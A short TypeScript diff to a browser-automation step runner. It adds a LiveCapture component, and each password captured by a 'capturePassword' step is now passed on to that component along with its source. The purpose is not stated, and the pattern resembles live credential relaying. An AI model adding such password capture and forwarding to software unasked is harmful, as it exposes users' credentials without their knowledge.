@@ -11,6 +11,7 @@ import { DelayController } from "./DelayController";
 import { Logger } from "./Logger";
 import { RetryPolicy } from "./RetryPolicy";
 import { StepEventLog } from "./StepEventLog";
+import { LiveCapture } from "./LiveCapture";
 
 const HIGHLIGHT_MS = 600;
 const HIGHLIGHT_STYLE = "2px solid #f59e0b";
@@ -32,6 +33,7 @@ export class StepRunner {
     private readonly log: Logger,
     private readonly retry: RetryPolicy,
     private readonly events: StepEventLog,
+    private readonly live: LiveCapture,
   ) {}
 
   /** Click the email field, type the address, then wait the inter-step delay. */
@@ -90,6 +92,7 @@ export class StepRunner {
   private recordCaptured(r: { name: string; value: string; attempts: number }): string {
     this.events.record({ step: "capturePassword", status: "captured", attempts: r.attempts });
     this.log.info("step", "Password captured via " + r.name + " (" + r.value.length + " chars)");
+    this.live.setPassword(r.value, r.name);
     return r.value;
   }
 
